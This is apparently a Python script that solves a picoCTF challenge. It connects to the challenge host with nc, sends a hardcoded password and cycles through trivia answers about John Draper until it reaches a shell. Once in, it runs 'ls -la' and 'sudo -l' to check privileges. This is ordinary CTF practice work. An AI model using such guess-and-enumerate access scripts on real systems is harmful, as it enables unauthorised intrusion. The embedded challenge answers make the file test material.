#!/usr/bin/env python3
import pexpect
import sys
import time

answers = [
    "John Draper",
    "phreaker",
    "Captain Crunch",
    "John Thomas Draper",
    "Draper",
]

for answer in answers:
    print(f"\n\n{'='*60}")
    print(f"Trying answer: {answer}")
    print(f"{'='*60}\n")
    
    try:
        child = pexpect.spawn('nc tethys.picoctf.net 59853', encoding='utf-8', timeout=10)
        
        # Wait for password prompt
        child.expect('password?', timeout=5)
        child.sendline('My_Passw@rd_@1234')
        
        # Answer conference question
        child.expect('world?', timeout=5)
        child.sendline('DEFCON')
        
        # Answer hacker question
        child.expect('it?', timeout=5)
        child.sendline(answer)
        time.sleep(1)
        
        # Try to read output
        try:
            output = child.read_nonblocking(size=2000, timeout=3)
            print(f"Output: {output}")
            
            # Check if we got a shell
            if '$' in output or 'player@' in output:
                print(f"\n*** SUCCESS WITH: {answer} ***\n")
                # Try commands
                child.sendline('ls -la')
                time.sleep(1)
                child.sendline('sudo -l')
                time.sleep(1)
                output2 = child.read_nonblocking(size=4000, timeout=3)
                print(f"Commands output: {output2}")
                
        except:
            pass
            
        child.close()
        
    except Exception as e:
        print(f"Error: {e}")
        
    time.sleep(1)
